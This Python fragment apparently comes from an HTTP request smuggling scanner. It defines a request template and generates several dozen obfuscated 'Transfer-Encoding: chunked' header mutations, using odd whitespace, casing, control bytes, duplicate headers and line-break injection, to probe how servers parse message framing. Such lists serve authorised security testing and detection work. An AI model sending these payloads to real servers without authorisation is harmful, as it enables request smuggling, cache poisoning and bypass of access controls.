
def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p

mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
mutations["spacejoin1"] = render_template("Transfer Encoding: chunked")
mutations["underjoin1"] = render_template("Transfer_Encoding: chunked")
mutations["smashed"] = render_template("Transfer Encoding:chunked")
mutations["space1"] = render_template("Transfer-Encoding : chunked")
mutations["valueprefix1"] = render_template("Transfer-Encoding:  chunked")
mutations["vertprefix1"] = render_template("Transfer-Encoding:\u000Bchunked")
mutations["commaCow"] = render_template("Transfer-Encoding: chunked, cow")
mutations["cowComma"] = render_template("Transfer-Encoding: cow, chunked")
mutations["contentEnc"] = render_template("Content-Encoding: chunked")
mutations["linewrapped1"] = render_template("Transfer-Encoding:\n chunked")
mutations["quoted"] = render_template("Transfer-Encoding: \"chunked\"")
mutations["aposed"] = render_template("Transfer-Encoding: 'chunked'")
mutations["lazygrep"] = render_template("Transfer-Encoding: chunk")
mutations["sarcasm"] = render_template("TrAnSFer-EnCODinG: cHuNkeD")
mutations["yelling"] = render_template("TRANSFER-ENCODING: CHUNKED")
mutations["0dsuffix"] = render_template("Transfer-Encoding: chunked\r")
mutations["tabsuffix"] = render_template("Transfer-Encoding: chunked\t")
mutations["revdualchunk"] = render_template("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
mutations["0dspam"] = render_template("Transfer\r-Encoding: chunked")
mutations["nested"] = render_template("Transfer-Encoding: cow chunked bar")
mutations["spaceFF"] = render_template("Transfer-Encoding:\xFFchunked")
mutations["accentCH"] = render_template("Transfer-Encoding: ch\x96nked")
mutations["accentTE"] = render_template("Transf\x82r-Encoding: chunked")
mutations["x-rout"] = render_template("X:X\rTransfer-Encoding: chunked")
mutations["x-nout"] = render_template("X:X\nTransfer-Encoding: chunked")
for i in range(0x1,0x20):
	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
	
for i in range(0x7F,0x100):
	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
	
